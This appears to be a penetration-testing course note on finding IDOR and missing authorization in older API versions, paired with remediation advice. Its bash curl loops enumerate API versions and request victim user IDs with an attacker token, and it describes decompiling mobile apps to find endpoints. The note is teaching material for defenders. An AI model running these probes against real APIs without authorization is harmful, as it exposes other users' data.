---
tags: [vapt, access-control, api, intermediate]
difficulty: intermediate
module: "21 - Access Control"
topic: "21.15 IDOR via API Versioning"
---

# 21.15 — IDOR via API Versioning

## API Versioning and Security

```
API VERSIONS EXIST BECAUSE:
  Developers add features → create v2 → v3 → etc.
  Old versions kept alive for backward compatibility
  
  COMMON VERSION FORMATS:
  /api/v1/users/42
  /api/v2/users/42
  /v1/users/42
  /api/users/42?version=1
  Accept: application/vnd.api+json;version=1  (header versioning)
  
  SECURITY PROBLEM:
  New versions get security updates → old versions don't!
  Access control added in v2? → v1 still has the vulnerability!
  
  REALITY:
  "We fixed the IDOR in v2, but v1 is still live for legacy clients"
  → Attacker uses v1 endpoint → original IDOR!
```

---

## Common API Version Security Gaps

```
SCENARIO 1: NEW AUTH ADDED TO v2, NOT v1
  v2: GET /api/v2/users/42 → requires auth token → 401 without auth
  v1: GET /api/v1/users/42 → no auth required!
  
  ATTACK: Use v1 endpoint without any token → unauthenticated access!

SCENARIO 2: IDOR FIXED IN v2, NOT v1
  v2: GET /api/v2/users/42 → checks ownership → 403 for wrong user
  v1: GET /api/v1/users/42 → no ownership check → returns data for any user
  
  ATTACK: Use v1 with any user ID → access anyone's data!

SCENARIO 3: ADMIN CHECK ADDED IN v2
  v2: DELETE /api/v2/users/42 → requires admin role
  v1: DELETE /api/v1/users/42 → no role check → any user can delete!

SCENARIO 4: OLD VERSION RETURNS MORE SENSITIVE DATA
  v2: GET /api/v2/users/42 → returns {name, email} (sanitized)
  v1: GET /api/v1/users/42 → returns {name, email, password_hash, ssn, api_key}
  → Old version has data leakage!

SCENARIO 5: DEPRECATION WITHOUT DECOMMISSION
  Developer: "v1 is deprecated, no one uses it, but we can't break legacy clients"
  Security: "v1 still works and has all the old vulnerabilities"
```

---

## Finding API Versions

```bash
# COMMON VERSION ENDPOINTS TO TRY:
BASE_URL="https://api.target.com"

# Version numbers in path:
for VERSION in v1 v2 v3 v4 v0 v5 v6 v7 v8 v9 v10; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/$VERSION/users")
  echo "$VERSION: $CODE"
done

# Also try without "api/" prefix:
for VERSION in v1 v2 v3 v4; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/$VERSION/users")
  echo "/$VERSION: $CODE"
done

# Date-based versions:
for VERSION in 2023-01-01 2022-01-01 2021-01-01; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/users" \
    -H "API-Version: $VERSION")
  echo "header $VERSION: $CODE"
done

# Word versions:
for VERSION in beta alpha preview legacy old current; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/$VERSION/users")
  echo "$VERSION: $CODE"
done

# STEP 2: Compare responses between versions:
curl -v "$BASE_URL/api/v1/users/42" 2>&1 | grep -E "^[<>]"
curl -v "$BASE_URL/api/v2/users/42" 2>&1 | grep -E "^[<>]"
# Different response? Different data? v1 returns more? → version-specific issues!
```

---

## Mobile App API Version Hunting

```
MOBILE APPS OFTEN LOCK TO OLD API VERSIONS:
  "Our iOS app still calls v1 because we haven't updated it"
  
  FINDING IN MOBILE APPS:
  1. Decompile APK: apktool d app.apk → grep -r "api/v" ./
  2. Intercept mobile traffic via Burp → check User-Agent + API version
  3. Look for Accept-Version or similar headers in intercepted requests
  
  ALSO: JS Web Apps:
  grep -r "v1\|v2\|/api/" src/
  # → Find all API calls in source
  
  FROM API DOCS:
  "This endpoint is deprecated but still functional"
  → Test deprecated endpoints for old security issues!
```

---

## Testing Version-Based IDOR

```bash
# SETUP: Use two test accounts
VICTIM_ID="43"  # victim's user ID
ATTACKER_TOKEN="Bearer ATTACKER_JWT_OR_SESSION"

# Baseline with current version (should be protected):
curl -H "Authorization: $ATTACKER_TOKEN" \
  "https://api.target.com/api/v2/users/$VICTIM_ID"
# → 403? Good (v2 properly protected)

# Test older versions:
for VERSION in v1 v0 v3; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: $ATTACKER_TOKEN" \
    "https://api.target.com/api/$VERSION/users/$VICTIM_ID")
  echo "$VERSION: $CODE"
done
# → v1: 200 → BUG! Old version unprotected!

# If authenticated endpoint → also test unauthenticated:
for VERSION in v1 v2 v3; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/api/$VERSION/users/$VICTIM_ID")
  echo "Unauth $VERSION: $CODE"
done
# → v1 returns 200 without token → unauthenticated IDOR!

# Also test admin-only endpoints on older versions:
for VERSION in v1 v2; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: $ATTACKER_TOKEN" \
    "https://api.target.com/api/$VERSION/admin/users")
  echo "Admin via $VERSION: $CODE"
done
```

---

## Fix

```
API VERSION SECURITY:

1. APPLY SAME ACCESS CONTROLS TO ALL VERSIONS:
   # Don't have separate auth middleware per version!
   # Single auth layer that covers all versions:
   
   # Express: Apply auth to all /api/ routes:
   app.use('/api', authenticate);  # covers /api/v1, /api/v2, etc.
   
   # Or: same middleware on all route handlers regardless of version

2. DECOMMISSION OLD VERSIONS PROPERLY:
   Don't just "deprecate" → actually remove or disable:
   # Return 410 Gone for deprecated endpoints:
   app.use('/api/v1', (req, res) => {
       res.status(410).json({
           error: 'API v1 is deprecated and no longer available',
           migration: 'https://docs.example.com/api-v2-migration'
       });
   });

3. VERSION-AGNOSTIC SECURITY LAYER:
   Security middleware runs BEFORE routing to specific version handler
   → Same security regardless of which version is called

4. AUDIT ON EACH NEW VERSION:
   When creating v2, audit v1 security controls
   Ensure v2 has at LEAST the same controls (ideally more)
   Don't ship new features if security is reduced vs v1

5. MONITOR OLD VERSION USAGE:
   Log which clients call old versions
   Contact them for migration
   Set hard deprecation date → actually kill v1 on that date

6. INVENTORY ALL ACTIVE VERSIONS:
   Maintain list of all active API versions
   Each has explicit security ownership
   No "it should be fine" assumptions about old versions
```

---

## Related Notes
- [[03 - IDOR — Insecure Direct Object Reference]] — IDOR fundamentals
- [[09 - BOLA — Broken Object Level Authorization (OWASP API #1)]] — API BOLA
- [[10 - BFLA — Broken Function Level Authorization (OWASP API #5)]] — API function access
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
